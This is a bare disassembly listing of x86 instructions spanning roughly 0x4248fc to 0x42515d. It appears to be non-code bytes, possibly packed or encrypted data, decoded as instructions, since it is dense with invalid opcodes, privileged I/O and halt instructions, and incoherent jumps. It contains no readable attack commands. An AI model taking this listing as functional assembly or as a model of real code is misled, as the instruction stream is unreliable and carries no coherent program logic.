  4248fc:	fmul   DWORD PTR [ecx]
  4248fe:	cmc    
  4248ff:	retf   
  424900:	std    
  424901:	out    dx,eax
  424902:	mov    ebp,0xf5eeedac
  424907:	jmp    0xb23909dd
  42490c:	(bad)  
  42490d:	(bad)  
  42490f:	sti    
  424910:	repnz f2xm1 
  424913:	fsubrp st(0),st
  424915:	mov    esp,0xd6c5d7f2
  42491a:	xlat   BYTE PTR ds:[ebx]
  42491b:	push   es
  42491c:	jmp    0xdce6:0xeae808e7
  424923:	into   
  424924:	ret    0xf3e3
  424927:	leave  
  424928:	aad    0xec
  42492a:	cmc    
  42492b:	mov    eax,0xeed3d0bf
  424930:	mov    ebp,0xfeeebfbe
  424935:	repz out 0xbc,eax
  424938:	hlt    
  424939:	cmc    
  42493a:	jmp    0x424903
  42493c:	sti    
  42493d:	fld    st(5)
  42493f:	add    bl,cl
  424941:	in     eax,dx
  424942:	fsubr  st(7),st
  424944:	mov    esp,0xf0e8cbe8
  424949:	cli    
  42494a:	call   0xf210340a
  42494f:	int3   
  424950:	loop   0x42490a
  424952:	test   DWORD PTR [eax],0xf9eddbcf
  424958:	(bad)  
  42495a:	(bad)  
  42495b:	out    0xc7,eax
  42495d:	inc    ah
  42495f:	in     al,dx
  424960:	fsub   st(6),st
  424962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424963:	jmp    0x42494f
  424965:	retf   
  424966:	stos   DWORD PTR es:[edi],eax
  424967:	in     eax,dx
  424968:	hlt    
  424969:	(bad)  
  42496a:	test   dh,0xc7
  42496d:	in     al,dx
  42496e:	iret   
  42496f:	mov    ebp,0xbadfdbdc
  424974:	aad    0xf0
  424976:	mov    esp,0xfed9c500
  42497b:	retf   
  42497c:	(bad)  [eax]
  42497e:	bswap  edi
  424980:	stc    
  424981:	shr    ecx,cl
  424983:	rcl    eax,1
  424985:	aad    0xc5
  424987:	in     eax,dx
  424988:	lds    esi,FWORD PTR [ebx-0x17262928]
  42498e:	call   0xbcff335c
  424993:	loope  0x42496a
  424995:	fsubr  st(3),st
  424997:	in     al,dx
  424998:	rcr    al,0xe5
  42499b:	sar    ch,0xb
  42499e:	ret    
  42499f:	in     eax,dx
  4249a0:	int3   
  4249a1:	push   cs
  4249a2:	repz div edx
  4249a5:	shr    esp,cl
  4249a7:	shl    BYTE PTR [edi-0x29264f33],cl
  4249ad:	mov    esi,0xedb4dacb
  4249b2:	add    ebp,ebx
  4249b4:	loop   0x4249ae
  4249b6:	add    al,0xf3
  4249b8:	repz jmp 0x424982
  4249bb:	hlt    
  4249bc:	or     ebp,esp
  4249be:	push   es
  4249bf:	int3   
  4249c0:	(bad)  
  4249c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249c3:	mov    edi,0xeeace0e0
  4249c8:	lods   eax,DWORD PTR ds:[esi]
  4249c9:	aad    0xb7
  4249cb:	scas   al,BYTE PTR es:[edi]
  4249cc:	clc    
  4249cd:	hlt    
  4249ce:	fldln2 
  4249d0:	cmc    
  4249d1:	cli    
  4249d2:	mov    ebp,0xe2b8e6ba
  4249d7:	jecxz  0x4249e3
  4249d9:	xlat   BYTE PTR ds:[ebx]
  4249da:	mul    eax
  4249dc:	out    0xc8,al
  4249de:	loop   0x4249bc
  4249e0:	(bad)  
  4249e2:	mov    edi,0xe9cec7d3
  4249e7:	lods   al,BYTE PTR ds:[esi]
  4249e8:	in     eax,0xd1
  4249ea:	jmp    0x4249be
  4249ec:	jmp    0x4249be
  4249ee:	shr    ch,1
  4249f0:	mov    cl,0xea
  4249f2:	jmp    0xf31921b0
  4249f7:	hlt    
  4249f8:	aam    0xd9
  4249fa:	out    0xeb,eax
  4249fc:	(bad)  
  4249fd:	jmp    0xebc2:0xff09e4d5
  424a04:	mov    edi,0xd6bcd2b7
  424a09:	sar    BYTE PTR [ecx-0x2537294b],cl
  424a0f:	cmc    
  424a10:	loop   0x424a08
  424a12:	leave  
  424a13:	stc    
  424a14:	ret    
  424a15:	out    0xd3,eax
  424a17:	out    0xc2,al
  424a19:	add    ecx,ecx
  424a1b:	out    0xc7,al
  424a1d:	push   cs
  424a1e:	call   0xe43122f1
  424a23:	enter  0xc3b7,0xc9
  424a27:	int    0xd7
  424a29:	rcr    dl,cl
  424a2b:	idiv   DWORD PTR [eax-0x3282030]
  424a31:	std    
  424a32:	mov    eax,0xf3f6e3b6
  424a37:	ret    
  424a38:	repz jmp 0x424a02
  424a3b:	(bad)
  424a3e:	add    DWORD PTR [eax],ecx
  424a40:	rcl    DWORD PTR [ecx],0xae
  424a43:	int    0xd0
  424a45:	retf   0xebe2
  424a48:	lods   al,BYTE PTR ds:[esi]
  424a49:	fcmovnb st,st(7)
  424a4b:	out    dx,eax
  424a4c:	lock repnz cld 
  424a4f:	les    edi,FWORD PTR [ebx-0x26070c2d]
  424a55:	repnz shl bh,cl
  424a58:	(bad)  
  424a59:	loopne 0x424a44
  424a5b:	leave  
  424a5c:	stc    
  424a5d:	add    al,0x5
  424a5f:	fmul   st,st(0)
  424a61:	enter  0xc7c5,0xeb
  424a65:	in     al,dx
  424a66:	(bad)  
  424a67:	sti    
  424a68:	into   
  424a69:	enter  0xe7f5,0xd8
  424a6d:	mov    edx,0xf3d3ddda
  424a72:	clc    
  424a73:	sar    BYTE PTR [edi-0x20143e0c],0xfa
  424a7a:	add    dh,dl
  424a7c:	aam    0xf5
  424a7e:	cmc    
  424a7f:	in     al,0x0
  424a81:	clc    
  424a82:	in     eax,dx
  424a83:	icebp  
  424a84:	loop   0x424a32
  424a86:	fsub   st(5),st
  424a88:	test   eax,0xcceac4e9
  424a8d:	mov    ebx,0xdcf6dcd6
  424a92:	jmp    0x6f7388b
  424a97:	cmc    
  424a98:	add    BYTE PTR [eax+eiz*8],al
  424a9b:	or     bh,bh
  424a9d:	add    ebp,eax
  424a9f:	or     eax,DWORD PTR [ecx]
  424aa1:	into   
  424aa2:	fld    st(4)
  424aa4:	leave  
  424aa5:	icebp  
  424aa6:	int3   
  424aa7:	loope  0x424a9c
  424aa9:	shl    BYTE PTR [edi-0x262d3925],0xd3
  424ab0:	xlat   BYTE PTR ds:[ebx]
  424ab1:	mov    esi,0xdde2dedf
  424ab6:	ret    
  424ab7:	mov    edx,0xc605f2df
  424abc:	out    0xf4,eax
  424abe:	or     al,0xd9
  424ac0:	or     eax,0xcfe3cdd9
  424ac5:	imul   DWORD PTR [ebx-0x1004052f]
  424acb:	fdiv   st,st(0)
  424acd:	fcmovbe st,st(3)
  424acf:	iret   
  424ad0:	mov    ecx,0xdbb9f6bc
  424ad5:	mov    edi,0xbd2ffbb
  424ada:	ret    
  424adb:	lock add al,0xe0
  424ade:	clc    
  424adf:	fld    DWORD PTR ds:0xd7c5e704
  424ae5:	jecxz  0x424ade
  424ae7:	sar    dl,0xd6
  424aea:	int    0xea
  424aec:	leave  
  424aed:	mov    eax,0xe3c9d8b9
  424af2:	(bad)  
  424af3:	fdivr  st(3),st
  424af5:	int    0xd9
  424af7:	sti    
  424af8:	aam    0xd7
  424afa:	leave  
  424afb:	fdivr  st,st(3)
  424afd:	clc    
  424afe:	or     ah,cl
  424b00:	add    BYTE PTR [eax],al
  424b02:	mov    bl,0xf3
  424b04:	in     al,0xe8
  424b06:	mov    bl,0xe8
  424b08:	mov    ebx,0xd2b7ead7
  424b0d:	mov    ecx,0xd3e8fef8
  424b12:	add    BYTE PTR [esi-0x202b4204],bh
  424b18:	cli    
  424b19:	mov    BYTE PTR [edx],0xfd
  424b1c:	push   cs
  424b1d:	add    al,0xdb
  424b1f:	fninit 
  424b21:	in     eax,0xf1
  424b23:	jmp    0xace1:0xe0b5e0eb
  424b2a:	retf   
  424b2b:	mov    eax,0xccfbdff9
  424b30:	jmp    0x424b2f
  424b32:	fcom   st(4)
  424b34:	std    
  424b35:	cmc    
  424b36:	fiadd  WORD PTR [esi+edi*8]
  424b39:	stc    
  424b3a:	or     DWORD PTR [ebx],eax
  424b3c:	jmp    0xed432a42
  424b41:	int    0xd0
  424b43:	scas   eax,DWORD PTR es:[edi]
  424b44:	mov    al,0xdd
  424b46:	jmp    0xd6cc:0xd8b5d4e5
  424b4d:	icebp  
  424b4e:	out    dx,eax
  424b4f:	call   ebp
  424b51:	fcomi  st,st(1)
  424b53:	int    0xf7
  424b55:	not    esi
  424b57:	shl    ebp,0xf8
  424b5a:	add    eax,0xfddfbd08
  424b5f:	hlt    
  424b60:	inc    DWORD PTR [eax]
  424b62:	loopne 0x424b31
  424b64:	lock jmp 0xbc0d144f
  424b6a:	out    0xb0,eax
  424b6c:	mov    ebx,0xd1f3bee8
  424b71:	(bad)  
  424b72:	rcl    bh,1
  424b74:	shl    eax,cl
  424b76:	icebp  
  424b77:	mov    esp,0xc4fa05d9
  424b7c:	leave  
  424b7d:	add    cl,BYTE PTR [esi]
  424b7f:	(bad)  
  424b80:	clc    
  424b81:	(bad)
  424b85:	rcl    dl,cl
  424b87:	repnz leave 
  424b89:	cmc    
  424b8a:	leave  
  424b8b:	jmp    0x424b6c
  424b8d:	aad    0xda
  424b8f:	mov    edi,0xd8f7c9f6
  424b94:	int    0xbe
  424b96:	mov    ebp,0xc3c7bcc0
  424b9b:	(bad)  
  424b9c:	out    0xc8,al
  424b9e:	ret    
  424b9f:	iret   
  424ba0:	fimul  WORD PTR ds:0xe6f2edac
  424ba6:	rol    ebx,1
  424ba8:	jmp    0x424b85
  424baa:	mov    ch,0xdf
  424bac:	in     eax,dx
  424bad:	mov    edi,0xd4d0d2b8
  424bb2:	cld    
  424bb3:	aad    0xd5
  424bb5:	fild   DWORD PTR [eax]
  424bb7:	rcl    cl,0xf4
  424bba:	add    eax,0xe7ddcac6
  424bbf:	(bad)  
  424bc0:	(bad)  
  424bc2:	int3   
  424bc3:	int3   
  424bc4:	in     eax,0xd0
  424bc6:	mov    al,0xe7
  424bc8:	icebp  
  424bc9:	in     eax,0xb9
  424bcb:	bnd jmp 0x424bb2
  424bce:	call   0xf90623bc
  424bd3:	in     eax,dx
  424bd4:	iret   
  424bd5:	sar    dl,0xe1
  424bd8:	retf   
  424bd9:	push   es
  424bda:	add    DWORD PTR [eax],ecx
  424bdc:	pop    es
  424bdd:	hlt    
  424bde:	push   es
  424bdf:	or     eax,0xceadecf8
  424be4:	out    0xb6,eax
  424be6:	mov    esp,0xc4acc2d7
  424beb:	mov    ch,0xd7
  424bed:	clc    
  424bee:	repnz fcomp st(2)
  424bf1:	add    bh,bl
  424bf3:	enter  0xe3fe,0xcd
  424bf7:	int3   
  424bf8:	neg    edi
  424bfa:	add    al,bh
  424bfc:	aad    0xd5
  424bfe:	retf   0x6ec
  424c01:	retf   
  424c02:	leave  
  424c03:	scas   al,BYTE PTR es:[edi]
  424c04:	iret   
  424c05:	lods   eax,DWORD PTR ds:[esi]
  424c06:	shl    dh,cl
  424c08:	out    0xba,al
  424c0a:	mov    cl,0xb2
  424c0c:	mov    dh,0xed
  424c0e:	in     al,0xde
  424c10:	fdivp  st(6),st
  424c12:	sar    DWORD PTR [ebp-0x1e270e1d],1
  424c18:	add    ebp,edi
  424c1a:	(bad)  
  424c1b:	call   0xe509451f
  424c20:	in     al,0xf8
  424c22:	leave  
  424c23:	shl    bh,0xde
  424c26:	jmp    0xbfd1:0xd0e0f6e6
  424c2d:	fidiv  DWORD PTR [ebx-0x400f3329]
  424c33:	out    0xd8,eax
  424c35:	(bad)  
  424c36:	push   ecx
  424c38:	(bad)
  424c3b:	sar    cl,1
  424c3d:	mov    esp,0xce02cd09
  424c42:	shr    al,cl
  424c44:	lock jmp 0x424c1d
  424c47:	lock lock (bad) 
  424c4b:	mov    dl,0xba
  424c4d:	(bad)  
  424c4e:	fdiv   QWORD PTR [ebp-0x3e120942]
  424c54:	std    
  424c55:	xlat   BYTE PTR ds:[ebx]
  424c56:	add    ebp,esi
  424c58:	aam    0xc5
  424c5a:	clc    
  424c5b:	jmp    0xc40d:0xcae501d9
  424c62:	in     eax,dx
  424c63:	mov    esp,0xc2b3f2d6
  424c68:	mov    al,0xd9
  424c6a:	aam    0xed
  424c6c:	mov    dh,0xb0
  424c6e:	xlat   BYTE PTR ds:[ebx]
  424c6f:	imul   edi
  424c71:	enter  0xd7b9,0xcc
  424c75:	inc    BYTE PTR [ecx]
  424c77:	add    eax,edi
  424c79:	(bad)  
  424c7b:	out    dx,eax
  424c7c:	add    DWORD PTR ds:0xc0c5ed09,eax
  424c82:	retf   0xe4df
  424c85:	mov    al,0xd3
  424c87:	scas   al,BYTE PTR es:[edi]
  424c88:	jmp    0xf60d357b
  424c8d:	mov    ch,0xd5
  424c8f:	fcmove st,st(1)
  424c91:	jmp    0xfdc3:0xbcfde3bf
  424c98:	inc    ecx
  424c9a:	cmc    
  424c9b:	fdivr  st,st(1)
  424c9d:	(bad)  
  424c9e:	jmp    0xc42e198e
  424ca3:	(bad)  
  424ca5:	jmp    0x424c8f
  424ca7:	retf   0xacda
  424caa:	out    0xae,al
  424cac:	fcomi  st,st(2)
  424cae:	std    
  424caf:	jmp    0xf8fb0f93
  424cb4:	fdivrp st(5),st
  424cb6:	int    0xb
  424cb8:	dec    BYTE PTR [ecx]
  424cba:	rol    BYTE PTR [edi],1
  424cbc:	sti    
  424cbd:	out    dx,eax
  424cbe:	enter  0xecb,0xe2
  424cc2:	les    edi,FWORD PTR [ebp-0x19481320]
  424cc8:	fcmovnb st,st(1)
  424cca:	cli    
  424ccb:	clc    
  424ccc:	int    0xca
  424cce:	mov    ah,0xee
  424cd0:	test   bh,0xc2
  424cd3:	sar    esi,cl
  424cd5:	add    dh,cl
  424cd7:	add    eax,0xebf5c2d1
  424cdc:	(bad)  
  424cdd:	imul   al
  424cdf:	fsub   st(7),st
  424ce1:	leave  
  424ce2:	in     al,dx
  424ce3:	into   
  424ce4:	ror    esp,1
  424ce6:	hlt    
  424ce7:	loopne 0x424cab
  424ce9:	shr    DWORD PTR [edi-0x4c0e1b12],cl
  424cef:	retf   
  424cf0:	mov    ebx,0xefe0f0f5
  424cf5:	ret    
  424cf6:	add    ch,bl
  424cf8:	fiadd  WORD PTR [ecx]
  424cfa:	xlat   BYTE PTR ds:[ebx]
  424cfb:	clc    
  424cfc:	(bad)  
  424cfd:	fild   WORD PTR [esi]
  424cff:	push   cs
  424d00:	add    dh,cl
  424d02:	(bad)
  424d05:	test   al,0xb3
  424d07:	mov    ch,0xc8
  424d09:	jmp    0xbbf6:0xd6dfd6cd
  424d10:	jmp    0x424d04
  424d12:	(bad)  
  424d14:	out    0x5,eax
  424d16:	sar    cl,cl
  424d18:	ffree  st(2)
  424d1a:	sti    
  424d1b:	shr    dl,0xc4
  424d1e:	in     eax,dx
  424d1f:	out    0xda,eax
  424d21:	fsub   st(0),st
  424d23:	mov    bl,0xc5
  424d25:	jecxz  0x424cdd
  424d27:	mov    dh,0xca
  424d29:	mov    cl,0xf4
  424d2b:	jmp    0xc3c8:0xceeeebb4
  424d32:	mov    ecx,0xfbbcd1e2
  424d37:	(bad)  
  424d38:	rcr    ebp,1
  424d3a:	add    edi,edx
  424d3c:	push   es
  424d3d:	fdivr  st(4),st
  424d3f:	fsubr  st(5),st
  424d41:	add    edi,ebp
  424d43:	loop   0x424d15
  424d45:	(bad)  
  424d46:	scas   al,BYTE PTR es:[edi]
  424d47:	sti    
  424d48:	mov    ch,0xc1
  424d4a:	icebp  
  424d4b:	call   0xf9273934
  424d50:	out    dx,eax
  424d51:	stc    
  424d52:	fsubp  st(4),st
  424d54:	mov    ch,0xfa
  424d56:	ffree  st(5)
  424d58:	mul    esi
  424d5a:	(bad)  
  424d5c:	(bad)  
  424d5d:	jmp    0xb3e9:0xe9c8050b
  424d64:	call   0xf01f134c
  424d69:	mov    bh,0xf5
  424d6b:	aad    0xad
  424d6d:	fxch   st(5)
  424d6f:	(bad)  
  424d70:	iret   
  424d71:	jmp    0xf1430976
  424d76:	repz ret 
  424d78:	add    eax,ebx
  424d7a:	xlat   BYTE PTR ds:[ebx]
  424d7b:	hlt    
  424d7c:	cmc    
  424d7d:	shr    ch,0xe6
  424d80:	int3   
  424d81:	out    dx,al
  424d82:	ret    
  424d83:	loopne 0x424d7b
  424d85:	repz (bad) 
  424d87:	repz rol eax,0xd6
  424d8b:	(bad)  
  424d8c:	div    DWORD PTR [eax-0x3028013b]
  424d92:	mov    edx,0xd4fdddd2
  424d97:	fdivr  st,st(0)
  424d99:	shl    cl,1
  424d9b:	cli    
  424d9c:	loopne 0x424da9
  424d9e:	sti    
  424d9f:	clc    
  424da0:	out    dx,al
  424da1:	out    dx,eax
  424da2:	in     eax,0xce
  424da4:	shl    esi,0xe1
  424da7:	fcomi  st,st(3)
  424da9:	fcmovbe st,st(2)
  424dab:	dec    ebp
  424dad:	rcl    cl,cl
  424daf:	cli    
  424db0:	div    eax
  424db2:	(bad)  
  424db3:	fcmove st,st(5)
  424db5:	loope  0x424dae
  424db7:	(bad)  
  424db8:	(bad)  
  424dba:	add    al,0xf6
  424dbc:	(bad)  
  424dbd:	(bad)  
  424dbf:	push   edx
  424dc1:	out    0xf1,eax
  424dc3:	enter  0xc3e3,0xe3
  424dc7:	bnd call 0xcc143ab4
  424dcd:	ror    dl,cl
  424dcf:	sti    
  424dd0:	fdiv   QWORD PTR [eax-0x26ff1742]
  424dd6:	hlt    
  424dd7:	fcomi  st,st(4)
  424dd9:	cmc    
  424dda:	(bad)  
  424ddb:	stc    
  424ddc:	ror    dl,0x9
  424ddf:	(bad)  
  424de1:	std    
  424de2:	out    0xc7,eax
  424de4:	mov    cl,0xea
  424de6:	mov    ebp,0xd0e6b0aa
  424deb:	shr    ecx,1
  424ded:	out    0xdb,al
  424def:	ror    eax,cl
  424df1:	leave  
  424df2:	stc    
  424df3:	loopne 0x424deb
  424df5:	std    
  424df6:	add    al,0xe2
  424df8:	aam    0xe3
  424dfa:	add    bh,al
  424dfc:	out    0x0,al
  424dfe:	(bad)  
  424dff:	leave  
  424e00:	into   
  424e01:	inc    dl
  424e03:	lods   al,BYTE PTR ds:[esi]
  424e04:	loope  0x424df1
  424e06:	(bad)  
  424e08:	loope  0x424df3
  424e0a:	loope  0x424e0b
  424e0c:	iret   
  424e0d:	cli    
  424e0e:	mov    edx,0xf7f4f7ce
  424e13:	idiv   DWORD PTR [ecx-0x2a192604]
  424e19:	(bad)  
  424e1b:	jmp    0x424dfa
  424e1d:	add    al,0xec
  424e1f:	into   
  424e20:	rcr    edx,0xc0
  424e23:	jecxz  0x424e09
  424e25:	(bad)  
  424e26:	iret   
  424e27:	in     al,dx
  424e28:	enter  0xb2b3,0xd1
  424e2c:	in     al,dx
  424e2d:	fdiv   DWORD PTR [ebp-0x43054b2a]
  424e33:	sti    
  424e34:	rol    BYTE PTR [ecx],0xc2
  424e37:	push   es
  424e38:	(bad)  
  424e39:	add    bh,BYTE PTR [edi-0x162bf4f1]
  424e3f:	mov    BYTE PTR [esp+edi*8],0xc8
  424e43:	shr    dl,0xb3
  424e46:	out    0xcb,al
  424e48:	fcmovnbe st,st(4)
  424e4a:	iret   
  424e4b:	aam    0xf9
  424e4d:	xlat   BYTE PTR ds:[ebx]
  424e4e:	out    dx,eax
  424e4f:	mov    esp,0xcfc3dbf4
  424e54:	(bad)  
  424e56:	cmc    
  424e57:	icebp  
  424e58:	loope  0x424e24
  424e5a:	add    edi,ebp
  424e5c:	add    ch,bl
  424e5e:	loope  0x424e5c
  424e60:	in     al,0xf8
  424e62:	shr    ebp,cl
  424e64:	mov    esi,0xf2d5abd1
  424e69:	call   0xfef41742
  424e6e:	aad    0xd7
  424e70:	(bad)  
  424e72:	mul    ebx
  424e74:	loope  0x424e3c
  424e76:	loope  0x424e68
  424e78:	out    0xc5,eax
  424e7a:	std    
  424e7b:	loopne 0x424e6c
  424e7d:	push   es
  424e7e:	fsub   st(2),st
  424e80:	push   es
  424e81:	or     eax,ebp
  424e83:	xlat   BYTE PTR ds:[ebx]
  424e84:	jmp    0xb2f62473
  424e89:	aad    0xcc
  424e8b:	mov    ah,0xfe
  424e8d:	push   esi
  424e8f:	(bad)  
  424e90:	aam    0xe1
  424e92:	add    cl,dl
  424e94:	mov    edi,0xd5f5cdc3
  424e99:	add    dh,bl
  424e9b:	add    al,0xc1
  424e9d:	enter  0xcd0b,0xea
  424ea1:	inc    eax
  424ea3:	rcr    bh,1
  424ea5:	mov    bl,0xe9
  424ea7:	icebp  
  424ea8:	enter  0xede4,0xcb
  424eac:	(bad)  
  424ead:	(bad)  
  424eaf:	retf   0xbbf7
  424eb2:	aad    0xcc
  424eb4:	out    0xe0,al
  424eb6:	add    al,BYTE PTR [edx]
  424eb8:	add    esp,ebx
  424eba:	hlt    
  424ebb:	jmp    0x424e95
  424ebd:	leave  
  424ebe:	int    0xe5
  424ec0:	in     eax,0xda
  424ec2:	stos   BYTE PTR es:[edi],al
  424ec3:	scas   eax,DWORD PTR es:[edi]
  424ec4:	in     eax,dx
  424ec5:	ror    cl,0xd6
  424ec8:	in     eax,0xd9
  424eca:	mov    bl,0xd5
  424ecc:	sar    al,1
  424ece:	iret   
  424ecf:	clc    
  424ed0:	(bad)  
  424ed2:	ffreep st(1)
  424ed4:	xlat   BYTE PTR ds:[ebx]
  424ed5:	lock int 0xfb
  424ed8:	retf   
  424ed9:	in     eax,0xc6
  424edb:	sti    
  424edc:	cmc    
  424edd:	mul    dh
  424edf:	retf   0xe6c8
  424ee2:	lds    ebp,FWORD PTR [edi+edi*4-0x4b2f0e51]
  424ee9:	int    0xc4
  424eeb:	into   
  424eec:	shl    bh,1
  424eee:	fcmovbe st,st(5)
  424ef0:	hlt    
  424ef1:	rcl    dl,1
  424ef3:	cli    
  424ef4:	(bad)  
  424ef6:	aam    0xf9
  424ef8:	loop   0x424efe
  424efa:	ret    
  424efb:	(bad)
  424efe:	int    0xcd
  424f00:	loope  0x424efb
  424f02:	shl    esp,0xa8
  424f05:	out    0xc9,eax
  424f07:	out    0xb6,al
  424f09:	jmp    0x424eec
  424f0b:	mov    dl,0xe5
  424f0d:	aam    0xee
  424f0f:	les    edi,FWORD PTR [ebp-0xf0f48]
  424f15:	xlat   BYTE PTR ds:[ebx]
  424f16:	xlat   BYTE PTR ds:[ebx]
  424f17:	add    bl,bl
  424f19:	jmp    0xfe191800
  424f1e:	jmp    0xc8515423
  424f23:	div    DWORD PTR [ecx-0x152f344a]
  424f29:	shr    BYTE PTR [edi-0x443b4f08],0xf2
  424f30:	mov    ah,0xce
  424f32:	xlat   BYTE PTR ds:[ebx]
  424f33:	mov    esp,0xd8d8e6f3
  424f38:	add    ah,ah
  424f3a:	not    bh
  424f3c:	mov    ebp,0xe1dcfac0
  424f41:	fld    st(2)
  424f43:	fistp  QWORD PTR [ebp+ecx*8-0x4523c0d]
  424f4a:	jmp    0xb9eb:0xd4c4dac5
  424f51:	call   0xd6194357
  424f56:	mul    dl
  424f58:	test   DWORD PTR [esi],0x1e0c1fb
  424f5e:	jecxz  0x424f5e
  424f60:	repnz pop es
  424f62:	int3   
  424f63:	rcr    ah,cl
  424f65:	int    0xf0
  424f67:	sti    
  424f68:	in     al,dx
  424f69:	out    0xe9,eax
  424f6b:	retf   0xeee5
  424f6e:	(bad)  
  424f6f:	int3   
  424f70:	mov    cl,0xfa
  424f72:	mov    esi,0xbe07f7fe
  424f77:	(bad)  
  424f79:	ret    
  424f7a:	add    ch,bl
  424f7c:	add    al,0xe4
  424f7e:	jmp    0x424f59
  424f80:	int    0xe1
  424f82:	out    0xea,al
  424f84:	test   ch,0xb0
  424f87:	in     al,0xf2
  424f89:	loope  0x424f3f
  424f8b:	jmp    0x3c8:0xfbf9d6c9
  424f92:	sar    DWORD PTR [edi+0x1edc7e7],1
  424f98:	loopne 0x424f6e
  424f9a:	stc    
  424f9b:	stc    
  424f9c:	push   cs
  424f9d:	add    al,0xca
  424f9f:	in     al,0x3
  424fa1:	push   cs
  424fa2:	jmp    0xbbe3:0xd4bec8f1
  424fa9:	repz mov bh,0xc8
  424fac:	mov    cl,0xf8
  424fae:	retf   0xeade
  424fb1:	stc    
  424fb2:	mov    ecx,0xdbfbf4c3
  424fb7:	icebp  
  424fb8:	add    bl,ah
  424fba:	lock neg ecx
  424fbd:	cld    
  424fbe:	loopne 0x424faa
  424fc0:	lds    ecx,FWORD PTR ds:0xb3c1e9ac
  424fc6:	ror    ecx,0xf1
  424fc9:	in     eax,0xfa
  424fcb:	lock mul ch
  424fce:	int3   
  424fcf:	mov    esp,0xd9fbbbfd
  424fd4:	std    
  424fd5:	rol    eax,0xdd
  424fd8:	fiadd  DWORD PTR [esi]
  424fda:	cld    
  424fdb:	rcl    ch,0xfb
  424fde:	call   0xf02c19dc
  424fe3:	scas   al,BYTE PTR es:[edi]
  424fe4:	mov    dl,0xcd
  424fe6:	bnd jmp 0xb60335bd
  424fec:	iret   
  424fed:	mov    eax,0xd2ddcfb8
  424ff2:	enter  0xbcd7,0xe3
  424ff6:	loop   0x424ff1
  424ff8:	retf   
  424ff9:	cld    
  424ffa:	out    0xfc,al
  424ffc:	push   cs
  424ffd:	retf   
  424ffe:	clc    
  424fff:	loop   0x425010
  425001:	jmp    0xeedc:0xc3f0f0c7
  425008:	loopne 0x424ff1
  42500a:	mov    dh,0xc0
  42500c:	sar    esi,cl
  42500e:	repz retf 
  425010:	mov    eax,0x101fff2
  425015:	aad    0xfe
  425017:	test   DWORD PTR [eax+esi*8],0xdb0607f1
  42501e:	jmp    0xd2ed:0xeefdede8
  425025:	rcl    dh,0xcb
  425028:	out    0xf3,al
  42502a:	out    dx,al
  42502b:	loopne 0x424ff1
  42502d:	into   
  42502e:	mov    esi,0xbcc8d6f1
  425033:	add    bl,ah
  425035:	rcr    ecx,cl
  425037:	add    esp,ebp
  425039:	mov    esp,0xcde306fe
  42503f:	repz adc bl,dh
  425042:	jmp    0xe4f2:0xc0e7f6b2
  425049:	jmp    0x425012
  42504b:	xlat   BYTE PTR ds:[ebx]
  42504c:	out    dx,eax
  42504d:	lock shl BYTE PTR [esi-0x9282825],cl
  425054:	loope  0x425046
  425056:	loopne 0x42505a
  425058:	mov    esp,0xe5fff8c3
  42505d:	push   cs
  42505e:	aam    0x13
  425060:	or     eax,DWORD PTR ds:0xaeb1aace
  425066:	ffree  st(5)
  425068:	(bad)  
  42506a:	mov    edx,0xb6e4ecc0
  42506f:	idiv   BYTE PTR [edx+0x6f9ceda]
  425075:	loopne 0x425078
  425077:	not    esp
  425079:	jecxz  0x425086
  42507b:	(bad)  
  42507c:	jmp    0x425053
  42507e:	psubb  mm4,mm7
  425081:	fadd   st(3),st
  425083:	out    0xce,al
  425085:	cmc    
  425086:	repz rol cl,1
  425089:	in     eax,dx
  42508a:	jmp    0x425061
  42508c:	aam    0xf0
  42508e:	(bad)  
  425090:	aam    0xc8
  425092:	(bad)  
  425094:	mov    esi,0xe6d5d9c7
  425099:	sti    
  42509a:	or     BYTE PTR [ebx],cl
  42509c:	retf   0x6ff
  42509f:	clc    
  4250a0:	int3   
  4250a1:	fisubr WORD PTR [ebp-0x3339192d]
  4250a7:	scas   al,BYTE PTR es:[edi]
  4250a8:	mov    bl,0xda
  4250aa:	stc    
  4250ab:	cli    
  4250ac:	sar    DWORD PTR [esi-0x33102713],cl
  4250b2:	mov    eax,0xc1ccf1d8
  4250b7:	mov    ebp,0xbef1c0cb
  4250bc:	hlt    
  4250bd:	(bad)  
  4250be:	jmp    0xccf7:0xaa0f07fe
  4250c5:	(bad)  
  4250c6:	in     al,0xf1
  4250c8:	mov    ah,0xfb
  4250ca:	out    0xae,al
  4250cc:	lock out dx,al
  4250ce:	icebp  
  4250cf:	out    dx,eax
  4250d0:	fidiv  WORD PTR [eax+ebp*8-0x1f294140]
  4250d7:	shl    bl,0xeb
  4250da:	or     al,al
  4250dc:	out    dx,al
  4250dd:	(bad)  
  4250df:	add    BYTE PTR [esi],cl
  4250e1:	int3   
  4250e2:	mov    ebp,0xe3e4ceef
  4250e7:	mov    ch,0xf6
  4250e9:	in     al,dx
  4250ea:	scas   eax,DWORD PTR es:[edi]
  4250eb:	test   esp,0xc3dbe5eb
  4250f1:	mov    al,0xe2
  4250f3:	rol    ebx,cl
  4250f5:	repz cli 
  4250f7:	mov    edx,0xf5e6f4d9
  4250fc:	iret   
  4250fd:	movntq (bad),mm3
  4250fe:	out    0xdf,eax
  425100:	push   cs
  425101:	in     al,dx
  425102:	iret   
  425103:	icebp  
  425104:	(bad)  
  425105:	rol    dl,cl
  425107:	lods   eax,DWORD PTR ds:[esi]
  425108:	mov    dl,0xd5
  42510a:	cmc    
  42510b:	jmp    0xca101109
  425110:	rcl    bh,cl
  425112:	in     eax,dx
  425113:	repnz mov edi,0xdf0504e0
  425119:	test   BYTE PTR [esi],0x6
  42511c:	fucomi st,st(2)
  42511e:	or     ecx,edi
  425120:	add    dl,dh
  425122:	(bad)  
  425123:	in     al,dx
  425124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425125:	in     al,0xf6
  425127:	mov    al,0xea
  425129:	loope  0x425104
  42512b:	stc    
  42512c:	cmc    
  42512d:	mov    edx,0xecfcc4d4
  425132:	enter  0xb8bc,0xce
  425136:	std    
  425137:	pop    es
  425138:	loope  0x42513f
  42513a:	or     esp,esp
  42513c:	push   es
  42513d:	retf   
  42513e:	(bad)  
  42513f:	push   cs
  425140:	out    dx,al
  425141:	add    al,0xd8
  425143:	scas   al,BYTE PTR es:[edi]
  425144:	int3   
  425145:	int    0xb2
  425147:	iret   
  425148:	jmp    0xe9301a40
  42514d:	mov    al,0xf5
  42514f:	enter  0xe8fe,0xe0
  425153:	lock fadd QWORD PTR [eax]
  425156:	(bad)  
  425157:	idiv   al
  425159:	rcr    ebx,1
  42515b:	aad    0xcf
  42515d:	cmc    
